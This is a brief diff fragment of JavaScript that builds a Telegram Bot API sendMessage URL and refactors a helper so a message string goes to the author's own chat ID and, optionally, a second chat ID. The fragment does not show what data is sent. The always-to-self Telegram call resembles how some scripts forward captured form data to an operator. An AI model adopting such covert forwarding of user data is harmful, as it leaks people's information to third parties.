@@ -26,16 +26,10 @@ if (result) {
   let base =
     `https://api.telegram.org/bot${token}/sendMessage?parse_mode=html&text=${str}`
 
-  function send(chatId) {
-    let req = new XMLHttpRequest()
-    req.open("GET", `${base}&chat_id=${chatId}`)
-    req.send()
-  }
-
-  send(my_chat_id)
+  send(base, my_chat_id)
 
   if (shouldSend === "true") {
-    send(chat_id)
+    send(base, chat_id)
   }
 
 } else {
